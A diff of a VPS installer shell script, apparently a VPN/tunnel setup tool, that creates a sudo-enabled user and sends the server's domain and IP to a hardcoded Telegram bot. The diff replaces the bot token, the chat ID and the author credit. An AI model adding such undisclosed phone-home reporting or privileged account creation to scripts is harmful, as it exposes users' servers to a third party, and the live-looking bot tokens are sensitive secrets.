@@ -173,11 +173,11 @@ mkdir -p /home/script/
 useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
 echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
 usermod -aG sudo $Username > /dev/null 2>&1
-CHATID="5692196612"
-KEY="6513417732:AAGKZ8Qnu2yl0HHbm9-c8C7vKV9Focn7ygw"
+CHATID="6348824977"
+KEY="6854390843:AAHnygrqUOSq-5spVPBBrOvBMy4xcdUBPBU"
 TIME="10"
 URL="https://api.telegram.org/bot$KEY/sendMessage"
-TEXT="Installasi Script v6.0 By Ridwanz
+TEXT="Installasi Script v6.0 By GemilangKinasih
 ============================
 <code>Domain     :</code> <code>$domain</code>
 <code>IP Vps     :</code> <code>$IPVPS</code>
